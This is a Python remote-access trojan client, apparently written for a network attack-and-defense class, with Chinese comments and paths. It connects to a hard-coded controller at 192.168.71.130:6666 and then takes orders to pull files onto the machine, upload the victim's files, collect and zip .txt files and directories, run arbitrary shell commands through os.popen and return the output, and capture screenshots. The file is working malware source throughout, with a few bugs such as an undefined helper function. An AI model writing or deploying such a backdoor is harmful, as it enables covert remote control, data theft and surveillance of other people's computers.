import socket
import os
import numpy as np
from PIL import ImageGrab
import struct
import json
import zipfile
import string
import shutil
import platform

def download():
    head_len = struct.unpack("i",s.recv(4))[0]
    get = s.recv(head_len)
    get_json = get.decode('UTF-8')
    dic = json.loads(get_json)
    print(dic)
    filesize = dic['size']
    filename = dic['name']
    data = b''
    with open('%s/%s' % (download_dir , filename),'wb') as f:
        recvsize = 0
        while recvsize<filesize:
            if filesize - recvsize < 1024:
                data = s.recv(filesize - recvsize)
            else:
                data = s.recv(1024)
            recvsize += len(data)
            f.write(data)
        else:
            f.close()
    print('done..')

def upload(filedir,filename):
    dic = {'size':os.path.getsize(r'%s/%s' % (filedir,filename)),'name':filename}
    dic_b = bytes(json.dumps(dic),encoding= 'UTF-8')
    dic_b_len = len(dic_b)
    obj = struct.pack('i',dic_b_len)
    s.send(obj)
    s.send(dic_b)
    f = open(filename,'rb')
    for line in f:
        s.send(line)
    else:
        print('done..')
    f.close()

def send(msgto):
  s.send(msgto.encode('UTF-8'))

def recv():
  msg_get = s.recv(1024)
  msg = msg_get.decode('UTF-8')
  print(msg)
  return(msg)

def get_file(filepath,filepath_new):
    filelists = []
    for root,dirs,files in os.walk(filepath):
        for file in files:
            if os.path.splitext(file)[1] == '.txt':
                file_path = os.path.join(root,file)
                filelists.append(file_path)
    for f in filelists:
        shutil.copy(f,filepath_new)

def zip_file_path(input_path, output_path, output_name):
    filelists = []
    files = os.listdir(input_path)
    for file in files:
        if os.path.isdir(input_path + '/' + file):
            get_zip_file(input_path + '/' + file, filelists)
        else:            
            filelists.append(input_path + '/' + file)
    f = zipfile.ZipFile(output_path + '/' + output_name, 'w', zipfile.ZIP_DEFLATED)
    for file in filelists:
        f.write(file)
    f.close()
    return output_path + r"/" + output_name
 
HOST = "192.168.71.130"
PORT = 6666
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
addr = ((HOST,PORT))
s.connect(addr)     # 连接服务器

download_dir = r'C:\Users\yangyi\Desktop\网络攻防\上传\\'

while True:
    msg = recv()
    if msg == 'download':
        download()
        send('done...')

    if msg == 'upload':
        filedir = recv()
        filename = recv()
        upload(filedir,filename)
        send('done...')
        
    if msg == 'quit':
        break

    if msg == 'getfile':
        filelists = []
        filepath = recv()
        filepath_new = recv()
        get_file(filepath,filepath_new)
        send('done...')

    if msg == 'zipfile':
        input_path = recv()
        output_path = recv()
        output_name = recv()
        zip_file_path(input_path,output_path,output_name)
        send('done...')
    
    if msg == 'cmd':
        msg_cmd = recv()
        t = os.popen(msg_cmd)
        m = t.read()
        m = m.strip()
        send(m)
        send('done...')

    if msg == 'jieping':
        img = ImageGrab.grab()
        img.save(r'C:\Users\yangyi\Desktop\网络攻防\\img.jpg','JPEG')
        send('done...')

    ##else:
      #  send('error')
        
    
s.close()
